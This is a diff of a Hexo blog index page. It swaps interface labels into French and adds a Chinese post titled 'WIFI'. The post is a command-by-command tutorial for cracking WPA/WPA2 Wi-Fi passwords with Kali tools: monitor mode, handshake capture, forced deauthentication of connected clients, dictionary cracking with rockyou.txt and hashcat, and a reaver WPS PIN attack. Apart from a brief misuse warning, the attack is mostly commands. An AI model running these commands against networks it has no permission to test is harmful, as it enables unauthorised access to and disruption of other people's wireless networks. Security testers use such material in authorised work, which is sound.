@@ -48,9 +48,9 @@
       </nav>
       <nav id="sub-nav">
         
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="Flux RSS"></a>
         
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+        <a id="nav-search-btn" class="nav-icon" title="Rechercher"></a>
       </nav>
       <div id="search-form-wrap">
         <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
@@ -60,6 +60,86 @@
 </header>
       <div class="outer">
         <section id="main">
+  
+    <article id="post-wifi" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/03/15/wifi/" class="article-date">
+  <time datetime="2017-03-15T10:30:22.000Z" itemprop="datePublished">2017-03-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/03/15/wifi/">WIFI</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="请勿乱用。"><a href="#请勿乱用。" class="headerlink" title="请勿乱用。"></a>请勿乱用。</h1><p>装备：kali，网卡（监控），8187/3070芯片。<br>使用工具<br>Airodump-ng 获取 AP 的 MAC 信息，连接信息以及是否握手成功。</p>
+<p>Aircrack-ng 支持基于 802.11 协议的 WEP 和 WPA/WPA2-PSK 密码破解</p>
+<p>Aireplay-ng 强行向目标 AP 发送数据包</p>
+<p>Airmon-ng 开启无线网卡的监视模式</p>
+<p>Wordlists.txt 字典包</p>
+<p>#确认网卡信息，表示mode（模式）为managed（被管理）<br><code>iwconfig</code></p>
+<p>#开启网卡监听模式<br><code>airmon-ng start wlan0</code></p>
+<p>#Found 3 processes that could cause trouble.</p>
+<p>#先取消wlan0mon模式，再设置wlan0mon为监控模式，再唤醒wlan0mon<br><code>ifconfig wlan0mon down</code><br><code>iwconfig wlan0mon mode monitor</code><br><code>ifconfig wlan0mon up</code></p>
+<p>#自动检查冲突程序并强制关闭<br><code>airmon-ng check kill</code></p>
+<p>#查询wlan0mon，此刻mode变为monitor<br><code>iwconfig wlan0mon</code></p>
+<p>#获取附近AP信息<br><code>airodump-ng wlan0mon</code></p>
+<p>#开始抓包<br>airodump-ng -c [CH] –bssid [BSSID] -w [path] wlan0mon</p>
+<p>#this is a ex,  airodump-ng -c [11] –bssid [0A:D6:B4:FB:E3:4D] -w ~/ wlan0mon</p>
+<p>#打开一个新的终端，并强制设备重新连接wifi或选择等待用户连接。</p>
+<p>#执行<br><code>aireplay-ng -0 2 -a 0A:D6:B4:FB:E3:4D -c 00:00:00:00:00:00 wlan0mon</code></p>
+<p>#如果成功，第一行最右边会是 WPA handshake： 00：00：00：00：00：00</p>
+<p>#得到握手包，结束监控模式，结束后应该就可以恢复网络连接了。<br><code>airmon-ng stop wlan0mon</code></p>
+<p>#开始破解密码</p>
+<p>#首先要有个字典，这里为kali自带的字典。</p>
+<p>#解压文件<br><code>gzip -d /usr/share/wordlists/rockyou.txt.gz</code></p>
+<p>#开始破解<br><code>aircrack-ng -a2 -b C8:3A:35:30:3E:C8 -w /usr/share/wordlists/rockyou.txt ~/*.cap</code></p>
+<p>#KEY FOUND![xxxxxxxxxx]</p>
+<p>#使用GPU跑字典<br>工具 hashcat ,kali自带。</p>
+<p>#将.cap文件转换为.hccap文件。<br><code>aircrack-ng x.cap -J xxx.hccap</code></p>
+<p>#使用GPU破解hash。<br><code>hashcat -m 2500 xxx.hccap</code></p>
+<h2 id="网络恢复，如果上面没有执行结束监控命令则执行以下命令。"><a href="#网络恢复，如果上面没有执行结束监控命令则执行以下命令。" class="headerlink" title="网络恢复，如果上面没有执行结束监控命令则执行以下命令。"></a>网络恢复，如果上面没有执行结束监控命令则执行以下命令。</h2><p><code>ifconfig wlan0mon down</code><br><code>iwconfig wlan0mon mode managed</code><br><code>ifconfig wlan0mon up</code></p>
+<p>#重启,不重启也可以。<br><code>reboot</code></p>
+<p>##关键词注释等。<br>AP(Access Point): 网络接入点，是一种连接无线或有线网络的设备。就是我们俗称的路由器。</p>
+<p>MAC(Media Access Control Address): 相当于网卡的身份证，MAC 地址本身是不能修改，但是可以通过伪造MAC 地址欺骗AP。</p>
+<p>WEP(Wireless Encryption Protocol): 无线加密协议。很早的一种加密协议，容易破解。</p>
+<p>WPA/WPA2(Wi-FiProtected Access): 基于WEP更安全的加密系统。</p>
+<p>Handshake:握手。我的理解相当于三次握手。</p>
+<p>IV(Initialization Vector)s:初始化向量。</p>
+<p>BSSID(Basic Service SetIdentifier): AP 的MAC 地址。<br>ESSID(The Extended Service Set Identifier): AP 的名称。<br>PWR(Power): 信号强度。<br>Beacons: AP发出的通告编号，每个接入点（AP）在最低速率（1M）时差不多每秒会发送10个左右的beacon，所以它们能在很远的地方就被发现。</p>
+<p>#Data:当前数据传输量。</p>
+<p>#/s:过去10秒钟内每秒捕获数据分组的数量。<br>CH(Channel): AP 所在的频道。<br>MB: AP 的最大传输速度。MB=11 =&gt; 802.11b，MB=22 =&gt; 802.11b+， MB&gt;22 =&gt; 802.11g。后面带.的表示短封包标头，处理速度快，更利于破解。<br>ENC(Encryption): 使用的加密算法体系。<br>CIPHER: 检测到的加密算法。#这个和ENC 的区别我确实不明白，有没有知道的朋友可以告诉我。<br>AUTH(Authority): 认证方式。<br>Elapsed: 用过的时间。</p>
+<h2 id="参数解释"><a href="#参数解释" class="headerlink" title="参数解释"></a>参数解释</h2><h2 id="airodump-ng"><a href="#airodump-ng" class="headerlink" title="airodump-ng"></a>airodump-ng</h2><p> -c指定频道号<br> –bssid指定路由器bssid<br> -w指定抓取的数据包保存位置</p>
+<h2 id="airplay-ng"><a href="#airplay-ng" class="headerlink" title="airplay-ng"></a>airplay-ng</h2><p>  -0指定发送反认证包的个数（是零，不是英文字母的o）<br>  -a指定无线路由器BSSID<br>  -c指定强制断开的设备</p>
+<h2 id="aircrack-ng"><a href="#aircrack-ng" class="headerlink" title="aircrack-ng"></a>aircrack-ng</h2><p>   -a2代表WPA的握手包<br>   -b指定要破解的wifi BSSID。<br>   -w指定字典文件</p>
+<h2 id="pin"><a href="#pin" class="headerlink" title="pin"></a>pin</h2><p>   <code>wash -i wlan0mon -C</code><br>   <code>reaver -i wlan0mon -b C8:3A:35:30:3E:C8 -vv -a</code></p>
+<h2 id="查看隐藏SSID"><a href="#查看隐藏SSID" class="headerlink" title="查看隐藏SSID"></a>查看隐藏SSID</h2><p>   <code>airodump-ng -c 6 --bssid C8:3A:35:30:3E:C8 wlan0mon</code><br>   <code>aireplay-ng -0 30 -a C8:3A:35:30:3E:C8 -c B8:E8:56:09:CC:9C wlan0mon</code></p>
+<h1 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h1><p><a href="http://www.jianshu.com/p/d4da13258f35" target="_blank" rel="external">作者Jglimmers</a><br><a href="http://www.linuxdiyf.com/linux/24060.html" target="_blank" rel="external">作者斗大的熊猫</a></p>
+<h1 id="简化"><a href="#简化" class="headerlink" title="简化"></a>简化</h1><p><code>airmon-ng check kill</code>    #自动检查关闭冲突程序<br><code>airmon-ng start wlan0</code>   #开启监控<br><code>airodump-ng wlan0mon</code>    #获取附近AP信息<br><code>airodump-ng -c [CH] --bssid [BSSID] -w [path] wlan0mon</code> #开始抓包<br><code>aireplay-ng -0 2 -a [BSSID] -c [连入设备的BSSID] wlan0mon</code> #强制重连<br><code>airmon-ng stop wlan0mon</code> #关闭监控<br><code>aircrack-ng -a2 -b [BSSID] -w [path字典] [path.cap]</code> #破解密码<br><code>#get key</code></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/03/15/wifi/" data-id="cj0att7g80003gkfwx1bcfrh4" class="article-share-link">Partager</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
   
     <article id="post-pil" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
@@ -118,7 +198,7 @@ import glob, os
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2017/03/12/pil/" data-id="cj06f4b4s0005vwfwyamk08wl" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2017/03/12/pil/" data-id="cj0att7h70007gkfwq89step3" class="article-share-link">Partager</a>
       
       
     </footer>
@@ -653,7 +733,7 @@ When converting from a colour image to black and white, the library uses the ITU
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2017/03/09/Python-笔记/" data-id="cj06f4b4l0001vwfwl381lztz" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2017/03/09/Python-笔记/" data-id="cj0att7f40002gkfwsrq596b1" class="article-share-link">Partager</a>
       
       
     </footer>
@@ -690,7 +770,7 @@ When converting from a colour image to black and white, the library uses the ITU
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2017/03/09/About-JPEG-EXIF/" data-id="cj06f4b4h0000vwfwikdmu6do" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2017/03/09/About-JPEG-EXIF/" data-id="cj0att7ex0000gkfwkuk7kacu" class="article-share-link">Partager</a>
       
       
     </footer>
@@ -741,7 +821,7 @@ When converting from a colour image to black and white, the library uses the ITU
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2017/03/06/markdown基本语法/" data-id="cj06f4b4r0004vwfwtdgzafs3" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2017/03/06/markdown基本语法/" data-id="cj0att7hd0008gkfwwpdoeqsp" class="article-share-link">Partager</a>
       
       
     </footer>
@@ -789,7 +869,7 @@ When converting from a colour image to black and white, the library uses the ITU
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2017/03/06/一些有趣的网站/" data-id="cj06f4b4v0006vwfwc96u4xkb" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2017/03/06/一些有趣的网站/" data-id="cj0att7ga0004gkfwvtdw53m4" class="article-share-link">Partager</a>
       
       
     </footer>
@@ -834,7 +914,7 @@ When converting from a colour image to black and white, the library uses the ITU
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2017/03/06/hello-world/" data-id="cj06f4b4o0002vwfw1wt9ivzw" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2017/03/06/hello-world/" data-id="cj0att7f20001gkfwqe664opj" class="article-share-link">Partager</a>
       
       
     </footer>
@@ -882,7 +962,7 @@ hexo version  #查看Hexo的版本
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2017/03/06/hexo搭建记录/" data-id="cj06f4b4q0003vwfwvd0pntnp" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2017/03/06/hexo搭建记录/" data-id="cj0att7h40005gkfwe80iv01t" class="article-share-link">Partager</a>
       
       
     </footer>
@@ -917,9 +997,13 @@ hexo version  #查看Hexo的版本
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
+    <h3 class="widget-title">Articles récents</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2017/03/15/wifi/">WIFI</a>
+          </li>
         
           <li>
             <a href="/2017/03/12/pil/">pil</a>
@@ -937,10 +1021,6 @@ hexo version  #查看Hexo的版本
             <a href="/2017/03/06/markdown基本语法/">markdown基本语法</a>
           </li>
         
-          <li>
-            <a href="/2017/03/06/一些有趣的网站/">一些有趣的网站</a>
-          </li>
-        
       </ul>
     </div>
   </div>
@@ -954,7 +1034,7 @@ hexo version  #查看Hexo的版本
   <div class="outer">
     <div id="footer-info" class="inner">
       &copy; 2017 D<br>
-      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+      Propulsé by <a href="http://hexo.io/" target="_blank">Hexo</a>
     </div>
   </div>
 </footer>
